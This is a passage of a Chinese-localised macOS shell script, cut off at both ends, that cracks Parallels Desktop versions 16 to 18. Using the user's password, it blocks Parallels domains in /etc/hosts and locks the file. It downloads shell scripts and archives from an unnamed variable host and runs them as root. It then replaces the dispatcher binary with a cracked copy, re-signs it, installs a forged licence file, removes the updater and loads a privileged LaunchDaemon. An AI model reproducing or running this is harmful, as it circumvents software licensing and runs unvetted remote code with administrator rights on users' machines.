   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.de" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.es" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.fr" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.nl" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.pt" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.ru" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallelskorea.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 pax-manager.myparallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 myparallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 my.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo chflags uchg /etc/hosts
    echo "$pass" | sudo -S sudo chflags schg /etc/hosts
    fi
   	fi
if [ -f ~/Downloads/JG_Download/ParallelsDesktop-16.5.1-50696.dmg ]; then 
curl -# -C - --connect-timeout 10 -o /tmp/16.5.sh "$ip5/16.5.1.sh" >/dev/null 2>&1
fi
if [ -f ~/Downloads/JG_Download/ParallelsDesktop-16.5.2-50703.dmg ]; then  	
curl -# -C - --connect-timeout 10 -o /tmp/16.5.sh "$ip5/16.5.2.sh" >/dev/null 2>&1
fi
if [ -f ~/Downloads/JG_Download/ParallelsDesktop-16.5.0-49183.dmg ]; then  	
curl -# -C - --connect-timeout 10 -o /tmp/16.5.sh "$ip5/16.5.0.sh" >/dev/null 2>&1
fi
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "bash /tmp/16.5.sh" password "$pass" with administrator privileges
do shell script "rm -rf /tmp/16.5.sh" password "$pass" with administrator privileges
do shell script "rm -rf '/Applications/Parallels Desktop.app/Contents/MacOS/prl_updater_ctl'" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo bash /tmp/16.5.sh >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf /tmp/16.5.sh
echo "$pass" | sudo -S sudo rm -rf /Applications/Parallels\ Desktop.app/Contents/MacOS/prl_updater_ctl
fi
#open -j -a /Applications/Parallels\ Desktop.app
#sleep 10 && killall -9 prl_client_app
#sleep 3
	fi
	else
	echo 正在下载必要组件，请等待....
	curl -# -C - --connect-timeout 10 -o /tmp/pd17sq.zip --retry 8888 "$ip5/pd17sq.zip"
    unzip -o "/tmp/pd17sq.zip" -d "/tmp">/dev/null 2>&1
	zhenhosts=$(cat /etc/hosts | grep www.parallels.com)
   	if [ ! "$zhenhosts" ]; then
   	if [ "$moderoot" ]; then
osascript <<EOD
if (do shell script "cat /etc/hosts") does not contain "download.parallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 download.parallels.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "update.parallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 update.parallels.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "desktop.parallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 desktop.parallels.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "download.parallels.com.cdn.cloudflare.net" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 download.parallels.com.cdn.cloudflare.net\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "update.parallels.com.cdn.cloudflare.net" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 update.parallels.com.cdn.cloudflare.net\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "desktop.parallels.com.cdn.cloudflare.net" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 desktop.parallels.com.cdn.cloudflare.net\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "www.parallels.cn" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 www.parallels.cn\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "www.parallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 www.parallels.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "www.parallels.de" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 www.parallels.de\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "www.parallels.es" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 www.parallels.es\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "www.parallels.fr" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 www.parallels.fr\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "www.parallels.nl" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 www.parallels.nl\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "www.parallels.pt" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 www.parallels.pt\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "www.parallels.ru" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 www.parallels.ru\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "www.parallelskorea.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 www.parallelskorea.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "reportus.parallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 reportus.parallels.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "parallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 parallels.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "parallels.cn" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 parallels.cn\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "parallels.de" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 parallels.de\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "parallels.es" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 parallels.es\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "parallels.fr" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 parallels.fr\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "parallels.nl" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 parallels.nl\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "parallels.pt" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 parallels.pt\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "parallels.ru" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 parallels.ru\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "parallelskorea.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 parallelskorea.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "pax-manager.myparallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 pax-manager.myparallels.com" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "myparallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 myparallels.com" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "my.parallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 my.parallels.com" >> /etc/hosts" password "$pass" with administrator privileges
end if
do shell script "chflags uchg /etc/hosts" password "$pass" with administrator privileges
do shell script "chflags schg /etc/hosts" password "$pass" with administrator privileges
EOD
    else
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 download.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 update.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 desktop.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 download.parallels.com.cdn.cloudflare.net" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 update.parallels.com.cdn.cloudflare.net" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 desktop.parallels.com.cdn.cloudflare.net" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.cn" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.de" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.es" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.fr" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.nl" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.pt" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.ru" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallelskorea.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 reportus.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.cn" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.de" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.es" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.fr" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.nl" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.pt" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.ru" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallelskorea.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 pax-manager.myparallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 myparallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 my.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo chflags uchg /etc/hosts
    echo "$pass" | sudo -S sudo chflags schg /etc/hosts
    fi
   	fi
    PDFM_DISP_CRACK="/tmp/pd17sq/prl_disp_service"
    PDFM_DISP_DST="/Applications/Parallels Desktop.app/Contents/MacOS/Parallels Service.app/Contents/MacOS/prl_disp_service"
    PDFM_DISP_ENT="/tmp/pd17sq/ParallelsService.entitlements"
    LICENSE_FILE="/tmp/pd17sq/licenses.json"
    LICENSE_DST="/Library/Preferences/Parallels/licenses.json"
    PDFM_DIR="/Applications/Parallels Desktop.app"
    "${PDFM_DIR}/Contents/MacOS/Parallels Service" service_stop
    killall -9 prl_client_app 2>/dev/null
    "${PDFM_DIR}/Contents/MacOS/Parallels Service" service_start
    "${PDFM_DIR}/Contents/MacOS/prlsrvctl" web-portal signout 2>/dev/null
    "${PDFM_DIR}/Contents/MacOS/prlsrvctl" --cep off 2>/dev/null
    "${PDFM_DIR}/Contents/MacOS/prlsrvctl" --allow-attach-screenshots off 2>/dev/null
    "${PDFM_DIR}/Contents/MacOS/Parallels Service" service_stop
    if [ "$moderoot" ]; then
    curl -# -C - --connect-timeout 10 -o /tmp/17.0.sh "$ip5/17.1.2.sh" >/dev/null 2>&1
osascript <<EOD
do shell script "bash /tmp/17.0.sh" password "$pass" with administrator privileges
do shell script "rm -rf /tmp/17.0.sh" password "$pass" with administrator privileges
EOD
    else
    echo "$pass" | sudo -S sudo cp -f "${PDFM_DISP_CRACK}" "${PDFM_DISP_DST}"
    echo "$pass" | sudo -S sudo chown root:wheel "${PDFM_DISP_DST}"
    echo "$pass" | sudo -S sudo chmod 755 "${PDFM_DISP_DST}"
    echo "$pass" | sudo -S sudo codesign -f -s - --timestamp=none --all-architectures --entitlements "${PDFM_DISP_ENT}" "${PDFM_DISP_DST}"
    echo "$pass" | sudo -S sudo rm -f "${LICENSE_DST}" > /dev/null
    echo "$pass" | sudo -S sudo cp "${LICENSE_FILE}" "${LICENSE_DST}"
    echo "$pass" | sudo -S sudo chown root:wheel "${LICENSE_DST}"
    echo "$pass" | sudo -S sudo chmod 444 "${LICENSE_DST}"
    echo "$pass" | sudo -S sudo rm -rf /Applications/Parallels\ Desktop.app/Contents/MacOS/prl_updater_ctl
    echo "$pass" | sudo -S sudo rm -rf /tmp/pd17sq
    echo "$pass" | sudo -S sudo rm -rf /tmp/pd17sq.zip
    fi
	fi
	else
	echo 正在下载必要组件，请等待....
    curl -# -C - --connect-timeout 10 -o /tmp/pd18sq.zip --retry 8888 "$ip5/pd18sq.zip"
    unzip -o "/tmp/pd18sq.zip" -d "/tmp">/dev/null 2>&1
    zhenhosts=$(cat /etc/hosts | grep www.parallels.com)
   	if [ ! "$zhenhosts" ]; then
   	if [ "$moderoot" ]; then
osascript <<EOD
if (do shell script "cat /etc/hosts") does not contain "download.parallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 download.parallels.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "update.parallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 update.parallels.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "desktop.parallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 desktop.parallels.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "download.parallels.com.cdn.cloudflare.net" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 download.parallels.com.cdn.cloudflare.net\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "update.parallels.com.cdn.cloudflare.net" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 update.parallels.com.cdn.cloudflare.net\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "desktop.parallels.com.cdn.cloudflare.net" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 desktop.parallels.com.cdn.cloudflare.net\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "www.parallels.cn" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 www.parallels.cn\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "www.parallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 www.parallels.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "www.parallels.de" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 www.parallels.de\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "www.parallels.es" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 www.parallels.es\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "www.parallels.fr" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 www.parallels.fr\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "www.parallels.nl" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 www.parallels.nl\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "www.parallels.pt" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 www.parallels.pt\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "www.parallels.ru" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 www.parallels.ru\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "www.parallelskorea.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 www.parallelskorea.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "reportus.parallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 reportus.parallels.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "parallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 parallels.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "parallels.cn" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 parallels.cn\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "parallels.de" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 parallels.de\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "parallels.es" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 parallels.es\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "parallels.fr" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 parallels.fr\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "parallels.nl" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 parallels.nl\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "parallels.pt" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 parallels.pt\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "parallels.ru" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 parallels.ru\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "parallelskorea.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 parallelskorea.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "pax-manager.myparallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 pax-manager.myparallels.com" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "myparallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 myparallels.com" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "my.parallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 my.parallels.com" >> /etc/hosts" password "$pass" with administrator privileges
end if
do shell script "chflags uchg /etc/hosts" password "$pass" with administrator privileges
do shell script "chflags schg /etc/hosts" password "$pass" with administrator privileges
EOD
    else
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 download.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 update.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 desktop.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 download.parallels.com.cdn.cloudflare.net" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 update.parallels.com.cdn.cloudflare.net" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 desktop.parallels.com.cdn.cloudflare.net" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.cn" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.de" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.es" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.fr" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.nl" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.pt" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.ru" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallelskorea.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 reportus.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.cn" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.de" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.es" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.fr" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.nl" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.pt" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.ru" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallelskorea.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 pax-manager.myparallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 myparallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 my.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo chflags uchg /etc/hosts
    echo "$pass" | sudo -S sudo chflags schg /etc/hosts
    fi
   	fi
    PDFM_DISP_CRACK="/tmp/pd18sq/prl_disp_service"
    PDFM_DISP_DST="/Applications/Parallels Desktop.app/Contents/MacOS/Parallels Service.app/Contents/MacOS/prl_disp_service"
    PDFM_DISP_DSTT="/Applications/Parallels Desktop.app/Contents/MacOS/Parallels Service.app/Contents/MacOS"
    PDFM_DISP_ENT="/tmp/pd18sq/ParallelsService.entitlements"
    LICENSE_FILE="/tmp/pd18sq/licenses.json"
    LICENSE_DST="/Library/Preferences/Parallels/licenses.json"
    PDFM_DIR="/Applications/Parallels Desktop.app"
    "${PDFM_DIR}/Contents/MacOS/Parallels Service" service_stop
    killall -9 prl_client_app 2>/dev/null
    "${PDFM_DIR}/Contents/MacOS/Parallels Service" service_start
    "${PDFM_DIR}/Contents/MacOS/prlsrvctl" web-portal signout 2>/dev/null
    "${PDFM_DIR}/Contents/MacOS/prlsrvctl" --cep off 2>/dev/null
    "${PDFM_DIR}/Contents/MacOS/prlsrvctl" --allow-attach-screenshots off 2>/dev/null
    "${PDFM_DIR}/Contents/MacOS/Parallels Service" service_stop
    if [ "$moderoot" ]; then
    curl -# -C - --connect-timeout 10 -o /tmp/18.0.sh "$ip5/18.0.1.sh" >/dev/null 2>&1
osascript <<EOD
do shell script "bash /tmp/18.0.sh" password "$pass" with administrator privileges
do shell script "rm -rf /tmp/18.0.sh" password "$pass" with administrator privileges
EOD
    else
    if [ "$dkzdqx" ]; then
    echo "$pass" | sudo -S sudo cp -f "${PDFM_DISP_CRACK}" "${PDFM_DISP_DST}"
    echo "$pass" | sudo -S sudo chown root:wheel "${PDFM_DISP_DST}"
    echo "$pass" | sudo -S sudo chmod 755 "${PDFM_DISP_DST}"
    echo "$pass" | sudo -S sudo codesign -f -s - --timestamp=none --all-architectures --entitlements "${PDFM_DISP_ENT}" "${PDFM_DISP_DST}"
    else
    echo "$pass" | sudo -S sudo chown root:wheel "${PDFM_DISP_CRACK}"
    echo "$pass" | sudo -S sudo chmod 755 "${PDFM_DISP_CRACK}"
    echo "$pass" | sudo -S sudo codesign -f -s - --timestamp=none --all-architectures --entitlements "${PDFM_DISP_ENT}" "${PDFM_DISP_CRACK}"
    echo "$pass" | sudo -S sudo rm -f "${PDFM_DISP_DST}" > /dev/null
    echo "$pass" | sudo -S sudo cp -f "${PDFM_DISP_CRACK}" "${PDFM_DISP_DSTT}"
    fi
    echo "$pass" | sudo -S sudo rm -f "${LICENSE_DST}" > /dev/null
    echo "$pass" | sudo -S sudo cp "${LICENSE_FILE}" "${LICENSE_DST}"
    echo "$pass" | sudo -S sudo chown root:wheel "${LICENSE_DST}"
    echo "$pass" | sudo -S sudo chmod 444 "${LICENSE_DST}"
    echo "$pass" | sudo -S sudo rm -rf /Applications/Parallels\ Desktop.app/Contents/MacOS/prl_updater_ctl
    echo "$pass" | sudo -S sudo rm -rf /tmp/pd18sq
    echo "$pass" | sudo -S sudo rm -rf /tmp/pd18sq.zip
    fi
	fi
	#curl --connect-timeout 10 -m 60 -o ~/Downloads/JG_Download/111.exe "$ip5/111.exe">/dev/null 2>&1
	if [[ $pdbb != "18" ]]; then
	if [[ $pdbb != "17" ]]; then
	if [ ! "$pd16jh" ]; then
	if [ "$moderoot" ]; then
osascript <<EOD
if (do shell script "cat /etc/hosts") does not contain "update.parallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 update.parallels.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
do shell script "mkdir -p /Library/LaunchDaemons" password "$pass" with administrator privileges
do shell script "mkdir -p /Library/PrivilegedHelperTools" password "$pass" with administrator privileges
do shell script "cp /Applications/启动Win系统.app/Contents/Library/LaunchServices/com.lihaoyun6.PD-Runner-Helper /Library/PrivilegedHelperTools/" password "$pass" with administrator privileges
do shell script "cp /Applications/启动Win系统.app/Contents/Resources/com.lihaoyun6.PD-Runner-Helper.plist /Library/LaunchDaemons/" password "$pass" with administrator privileges
do shell script "chmod 600 /Library/LaunchDaemons/com.lihaoyun6.PD-Runner-Helper.plist" password "$pass" with administrator privileges
do shell script "launchctl load /Library/LaunchDaemons/com.lihaoyun6.PD-Runner-Helper.plist" password "$pass" with administrator privileges
EOD
    else
   	zhenhosts=$(cat /etc/hosts | grep update.parallels.com)
   	if [ ! "$zhenhosts" ]; then
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 update.parallels.com" >> /etc/hosts'
   	fi
   	echo "$pass" | sudo -S sudo mkdir -p /Library/LaunchDaemons >/dev/null 2>&1
   	echo "$pass" | sudo -S sudo mkdir -p /Library/PrivilegedHelperTools >/dev/null 2>&1
   	echo "$pass" | sudo -S sudo cp /Applications/启动Win系统.app/Contents/Library/LaunchServices/com.lihaoyun6.PD-Runner-Helper /Library/PrivilegedHelperTools/ >/dev/null 2>&1
   	echo "$pass" | sudo -S sudo cp /Applications/启动Win系统.app/Contents/Resources/com.lihaoyun6.PD-Runner-Helper.plist /Library/LaunchDaemons/ >/dev/null 2>&1
   	echo "$pass" | sudo -S sudo chmod 600 /Library/LaunchDaemons/com.lihaoyun6.PD-Runner-Helper.plist >/dev/null 2>&1
   	echo "$pass" | sudo -S sudo launchctl load /Library/LaunchDaemons/com.lihaoyun6.PD-Runner-Helper.plist >/dev/null 2>&1
   	defaults write com.lihaoyun6.PD-Runner PDST 0
   	defaults write com.lihaoyun6.PD-Runner runAtLogin 0
   	if [[ $pdbb = "18" ]]; then
   	defaults write com.lihaoyun6.PD-Runner AppleLanguages '("en")'
   	defaults write com.lihaoyun6.PD-Runner disableUpdate 1
   	defaults write com.lihaoyun6.PD-Runner PDST 1
   	defaults write com.lihaoyun6.PD-Runner runAtLogin 1
   	osascript <<EOD
tell application "System Events"
make login item with properties {path:"/Applications/启动Win系统.app", hidden:false}
end tell
EOD
   	fi
   	fi
   	fi
   	fi
   	fi
   	if [[ $pdbb != "18" ]]; then
   	if [[ $pdbb != "17" ]]; then
   	if [ -e /Applications/启动Win系统.app ]; then
